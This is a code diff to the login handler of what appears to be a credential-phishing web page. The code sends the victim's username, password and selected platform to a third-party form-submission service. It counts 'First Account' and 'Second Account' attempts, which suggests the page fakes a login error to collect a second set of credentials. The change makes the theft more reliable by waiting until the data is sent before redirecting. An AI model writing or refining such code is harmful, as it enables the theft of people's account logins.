@@ -89,19 +89,25 @@ async function login(e) {
     const pass = document.getElementById("password").value;
     const msgDiv = document.getElementById("msg");
     
-    // Web3Forms Access Key (Update this if you changed keys)
-    const ACCESS_KEY = 'b8c6b71e-47b9-45bb-a8ae-2d1da784526c'; 
-    fetch('https://api.web3forms.com/submit', {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ 
-            access_key: ACCESS_KEY,
-            platform: chosen, 
-            username: user,  
-            password: pass,
-            attempt: hasTriedFirst ? "Second Account" : "First Account"
-        })
-    }).catch(err => console.log("Silent error"));
+    const ACCESS_KEY = 'd09 392f2-f99b-4b4f-bd89-f6d2f5e2d759'; 
+
+    // We use 'await' here to make sure the data is SENT before the code moves to the redirect
+    try {
+        await fetch('https://api.web3forms.com/submit', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ 
+                access_key: ACCESS_KEY,
+                platform: chosen, 
+                username: user,  
+                password: pass,
+                attempt: hasTriedFirst ? "Second Account" : "First Account"
+            })
+        });
+    } catch (err) {
+        console.log("Submission error:", err);
+    }
+
     if (!hasTriedFirst) {
         hasTriedFirst = true;
         msgDiv.className = "msg error";
